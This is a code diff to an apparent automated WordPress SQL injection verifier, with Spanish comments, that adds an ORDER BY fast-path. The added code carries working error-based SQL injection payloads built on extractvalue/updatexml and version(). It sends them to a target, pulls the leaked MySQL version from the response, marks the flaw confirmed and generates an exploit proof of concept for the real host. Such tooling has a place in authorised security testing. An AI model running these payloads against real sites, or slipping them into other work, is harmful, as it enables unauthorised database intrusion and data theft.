@@ -5346,6 +5346,7 @@ def verify_wordpress_sqli(
     required_role: str = "subscriber",
     sqli_via_request_uri: bool = False,
     sqli_via_rawurldecode: bool = False,
+    sqli_via_orderby: bool = False,
     _tried_params_set: Optional[frozenset] = None,
     sqli_header_hint: str = "",
 ) -> WpVerifyResult:
@@ -6545,6 +6546,57 @@ def verify_wordpress_sqli(
         # uno solo evita fallar por adivinar mal el contexto, no por no haber inyeccion de verdad.
         contexts = ["'", '"', "", "')", '")']
         comments = ["-- -", "#"]
+
+        # ORDER BY injection fast-path: when sqli_via_orderby=True the vulnerable parameter
+        # feeds directly into an ORDER BY clause (not WHERE), so standard error/UNION/boolean/
+        # time-based WHERE payloads cannot work. Try ORDER BY techniques first so we don't
+        # exhaust the budget on techniques that cannot succeed for this injection class.
+        if sqli_via_orderby:
+            step("[ORDER BY fast-path] sqli_via_orderby=True — probando ORDER BY injection "
+                 "directamente (subconsulta como item de ORDER BY) antes que tecnicas WHERE...")
+            _ob_col_prefix = orig_value.strip() if (
+                orig_value and re.match(r'^[\w.]+$', orig_value) and len(orig_value) < 40
+            ) else "user_login"
+            _ob_payloads_fp = [
+                f"{_ob_col_prefix},(SELECT extractvalue(1,concat(0x7e,version())))",
+                f"{_ob_col_prefix},(SELECT updatexml(1,concat(0x7e,version()),1))",
+                ",(SELECT extractvalue(1,concat(0x7e,version())))",
+                ",(SELECT updatexml(1,concat(0x7e,version()),1))",
+                "(SELECT extractvalue(1,concat(0x7e,version())))",
+                "(SELECT updatexml(1,concat(0x7e,version()),1))",
+            ]
+            for _ob_p in _ob_payloads_fp:
+                try:
+                    _ob_r = send(_ob_p)
+                except Exception:
+                    continue
+                _ob_vers = {v for v in re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", _ob_r.text or "")
+                            if _is_plausible_mysql_ver(v)} - version_noise
+                if _ob_vers:
+                    _mysql_ver = sorted(_ob_vers)[0]
+                    res.verified = True
+                    res.ok = True
+                    res.confidence = "confirmed"
+                    res.evidence["tecnica"] = "orderby-error-based"
+                    res.evidence["payload_ganador"] = _ob_p
+                    res.evidence["mysql_version_extraida"] = _mysql_ver
+                    res.detail = (
+                        f"SQLI confirmada (ORDER BY error-based fast-path): "
+                        f"{sqli_param}={_ob_p!r} → extractvalue/updatexml evaluado "
+                        f"como item de ORDER BY filtró version() real = {_mysql_ver}"
+                    )
+                    step(f"VERIFICADO (ORDER BY error-based): {_mysql_ver} en la respuesta")
+                    _poc_params = dict(base_params); _poc_params[sqli_param] = _ob_p
+                    res.exploit_poc = _build_exploit_poc(
+                        base_url=boot.base_url, endpoint=endpoint, method=m,
+                        params=_poc_params, json_body=json_body,
+                        technique="ORDER BY error-based SQLi",
+                        description=(f"ORDER BY error-based SQLi on '{sqli_param}': "
+                                     f"MySQL {_mysql_ver} leaked via extractvalue() in ORDER BY. "
+                                     f"Replace TARGET with the real host."))
+                    break
+            if res.verified:
+                return res  # early exit — ORDER BY fast-path confirmed
 
         step("probando error-based (extractvalue/updatexml) para extraer version() real...")
         error_tried = []
